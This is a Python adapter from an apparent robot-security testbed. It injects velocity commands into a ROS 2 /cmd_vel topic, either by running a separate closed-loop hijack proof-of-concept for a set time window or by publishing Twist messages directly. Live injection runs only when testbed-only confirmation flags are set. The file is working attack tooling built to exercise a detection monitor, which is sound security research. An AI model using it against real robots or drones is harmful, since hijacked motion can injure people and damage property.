"""Scenario A replay adapter for /cmd_vel control-plane injection."""

import os
import signal
import subprocess
import sys
import time
from pathlib import Path
from typing import Any

from agents.contracts import AttackAction


ADAPTER_NAME = "adapter_a_cmdvel"
DEFAULT_TOPIC = "/cmd_vel"
DEFAULT_ROS_DOMAIN_ID = "17"
DEFAULT_MESSAGE_COUNT = 5
DEFAULT_DELAY_S = 0.05

# The report's standalone Scenario A attack PoC (§6.2.1): a closed-loop hijack
# that sniffs /odometry/filtered and drives /cmd_vel toward the attacker target.
REPO_ROOT = Path(__file__).resolve().parents[2]
DEMO_ATTACK = (REPO_ROOT / "demo" / "hijack_nav.py").resolve()
DEFAULT_ATTACK_WINDOW_S = 3.0


def result(status: str, action: AttackAction, detail: dict[str, Any]) -> dict[str, Any]:
    return {
        "status": status,
        "adapter": ADAPTER_NAME,
        "mode": action.mode,
        "detail": detail,
    }


def simulate(action: AttackAction) -> dict[str, Any]:
    params = action.parameters
    observed_at = str(params.get("observed_at", params.get("fresh_after", "")))
    snapshot = {
        "observed_at": observed_at,
        "publishers": ["/attack/cmd_vel_injector", "/ros2_mavlink_bridge"],
        "rate_samples_hz": [8.0, float(params.get("rate_spike_hz", 25.0))],
        "velocity_samples": [
            {
                "linear": {"x": float(params.get("linear_x", 1.5))},
                "angular": {"z": float(params.get("angular_z", 0.1))},
            }
        ],
    }
    return result("simulated", action, {"snapshot": snapshot})


def publisher_names(node: Any, topic: str) -> list[str]:
    names = []
    for info in node.get_publishers_info_by_topic(topic):
        namespace = str(getattr(info, "node_namespace", "") or "").rstrip("/")
        name = str(getattr(info, "node_name", "") or "")
        if namespace and namespace != "/":
            names.append(f"{namespace}/{name}")
        elif name:
            names.append(f"/{name}")
    return sorted(set(names))


def run_demo_attack(window_s: float) -> dict[str, Any] | None:
    """Run the report's standalone hijack PoC (demo/hijack_nav.py) as a bounded,
    allowlisted subprocess so the live Command Monitor observes the real
    closed-loop /cmd_vel hijack, then terminate it. Returns None when the script
    is absent (e.g. demo/ not mounted) so the caller can fall back to the
    lightweight rclpy replay. Never uses shell=True and never runs a
    caller-supplied path."""
    if not DEMO_ATTACK.is_file():
        return None

    proc = subprocess.Popen(
        [sys.executable, str(DEMO_ATTACK)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        cwd=str(REPO_ROOT),
    )
    time.sleep(max(0.5, window_s))
    # SIGINT so hijack_nav.py's KeyboardInterrupt handler exits cleanly (publishes
    # a final zero Twist and shuts down) instead of being hard-killed.
    proc.send_signal(signal.SIGINT)
    try:
        out, err = proc.communicate(timeout=3.0)
    except subprocess.TimeoutExpired:
        proc.kill()
        out, err = proc.communicate()

    return {
        "via": "demo/hijack_nav.py",
        "target": [3.0, 2.0],
        "attack_window_s": window_s,
        "returncode": proc.returncode,
        "stdout": (out or "").strip()[-500:],
        "stderr": (err or "").strip()[-300:],
    }


def inject(action: AttackAction) -> dict[str, Any]:
    if action.mode != "live" or not action.confirm_live_testbed_only:
        return result(
            "blocked",
            action,
            {"reason": "live injection requires --live --confirm-live-testbed-only"},
        )

    # Prefer the report's faithful closed-loop hijack PoC; fall back to the
    # lightweight rclpy publisher replay if demo/hijack_nav.py is unavailable.
    window_s = float(action.parameters.get("attack_window_s", DEFAULT_ATTACK_WINDOW_S))
    demo = run_demo_attack(window_s)
    if demo is not None:
        return result("injected", action, {"topic": DEFAULT_TOPIC, "attack": demo})

    return _inject_replay(action)


def _inject_replay(action: AttackAction) -> dict[str, Any]:
    try:
        import rclpy  # type: ignore[import-not-found]
        from geometry_msgs.msg import Twist  # type: ignore[import-not-found]
    except ImportError as exc:
        return result(
            "unavailable",
            action,
            {"reason": "rclpy or geometry_msgs unavailable", "error": str(exc)},
        )

    params = action.parameters
    topic = str(params.get("topic", DEFAULT_TOPIC))
    count = max(1, int(params.get("message_count", DEFAULT_MESSAGE_COUNT)))
    delay_s = max(0.0, float(params.get("delay_s", DEFAULT_DELAY_S)))
    os.environ.setdefault("ROS_DOMAIN_ID", str(params.get("ros_domain_id", DEFAULT_ROS_DOMAIN_ID)))

    rclpy.init(args=None)
    node = rclpy.create_node("dah_replay_cmdvel_adapter")
    try:
        publisher = node.create_publisher(Twist, topic, 10)
        msg = Twist()
        msg.linear.x = float(params.get("linear_x", 1.0))
        msg.angular.z = float(params.get("angular_z", 0.0))
        observed_at = str(params.get("observed_at", params.get("fresh_after", "")))
        publishers = publisher_names(node, topic)
        for _ in range(count):
            publisher.publish(msg)
            rclpy.spin_once(node, timeout_sec=0.0)
            time.sleep(delay_s)
        publishers = sorted(set(publishers + publisher_names(node, topic)))
    finally:
        node.destroy_node()
        rclpy.shutdown()

    duration_s = max(delay_s * count, delay_s)
    snapshot = {
        "observed_at": observed_at,
        "publishers": publishers,
        "publish_rate_hz": round(count / duration_s, 3) if duration_s > 0 else float(count),
        "velocity_samples": [
            {
                "linear": {"x": float(params.get("linear_x", 1.0))},
                "angular": {"z": float(params.get("angular_z", 0.0))},
            }
        ],
    }
    return result(
        "injected",
        action,
        {
            "topic": topic,
            "message_count": count,
            "ros_domain_id": os.environ.get("ROS_DOMAIN_ID"),
            "snapshot": snapshot,
        },
    )
